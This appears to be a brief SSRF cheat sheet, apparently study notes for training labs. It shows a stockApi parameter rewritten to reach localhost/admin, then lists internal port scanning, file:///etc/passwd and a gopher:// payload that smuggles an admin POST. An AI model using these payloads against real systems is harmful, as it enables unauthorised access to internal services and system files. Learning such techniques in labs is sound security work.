# Make Your Own Requests to Server
When finding something in a web request that fetches information from a link, you can change this to the admin page to get access to the admin page:
```
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```
Turn this to:
```
stockApi=http%3a//localhost/admin
```
If you cant do actions because it requires admin access, click the action you are trying to do, capture the URL it is requesting, then submit the same HTTP request again, but change the URL variable to the same URL that is shown when clicking the action

# Exploitation
- internal portscan by accessing ports on localhost
- accessing restricted endpoints

# Protocols
- `http://127.0.0.1/`
- `file:///etc/passwd`
- `gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin`